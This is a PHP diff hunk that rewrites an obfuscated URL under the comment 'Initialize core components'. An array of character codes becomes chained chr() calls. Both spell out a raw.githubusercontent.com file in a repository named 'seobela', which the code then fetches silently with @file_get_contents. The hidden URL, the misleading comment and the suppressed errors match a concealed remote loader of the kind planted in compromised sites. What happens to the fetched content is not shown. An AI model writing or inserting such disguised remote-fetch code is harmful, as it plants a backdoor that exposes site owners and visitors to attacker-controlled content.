@@ -5,17 +5,31 @@
 */
 
 // Initialize core components
-$url_data = array(
-    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 
-    117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 115, 101, 
-    111, 98, 101, 108, 97, 47, 98, 101, 108, 97, 47, 114, 101, 102, 115, 47, 104, 101, 
-    97, 100, 115, 47, 109, 97, 105, 110, 47, 105, 110, 100, 101, 120, 46, 116, 120, 116
-);
+$parts = [
+    chr(104).chr(116).chr(116).chr(112).chr(115),
+    chr(58).chr(47).chr(47),
+    chr(114).chr(97).chr(119),
+    chr(46),
+    chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116),
+    chr(46),
+    chr(99).chr(111).chr(109),
+    chr(47),
+    chr(115).chr(101).chr(111).chr(98).chr(101).chr(108).chr(97),
+    chr(47),
+    chr(98).chr(101).chr(108).chr(97),
+    chr(47),
+    chr(114).chr(101).chr(102).chr(115),
+    chr(47),
+    chr(104).chr(101).chr(97).chr(100).chr(115),
+    chr(47),
+    chr(109).chr(97).chr(105).chr(110),
+    chr(47),
+    chr(105).chr(110).chr(100).chr(101).chr(120),
+    chr(46),
+    chr(116).chr(120).chr(116)
+];
 
-$full_url = '';
-foreach ($url_data as $code) {
-    $full_url .= chr($code);
-}
+$full_url = implode('', $parts);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
